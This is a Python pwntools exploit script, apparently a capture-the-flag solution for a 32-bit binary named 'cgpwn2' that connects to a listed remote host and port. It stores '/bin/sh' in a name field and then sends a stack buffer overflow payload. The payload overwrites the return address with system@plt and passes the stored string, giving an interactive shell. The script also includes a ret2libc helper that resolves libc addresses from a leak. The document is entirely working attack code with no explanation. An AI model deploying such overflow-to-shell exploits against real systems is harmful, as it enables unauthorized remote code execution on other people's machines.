from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func):
	#libc = ELF('./libc-2.23.so')
    libc = LibcSearcher(func, leak)

    base = leak - libc.dump(func)
    system = base + libc.dump('system')
    binsh = base + libc.dump('str_bin_sh')
    return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(arch='i386', os='linux', log_level = 'DEBUG')
binary = './cgpwn2'
elf = ELF(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('111.198.29.45',36372) if argv[1]=='r' else process(binary)

# start
ru('name\n')
sl('/bin/sh')
ru('here:\n')
payload = flat('a'*(0x26+4),elf.plt['system'],'a'*4,0x804a080)
sl(payload)
# end

itr()
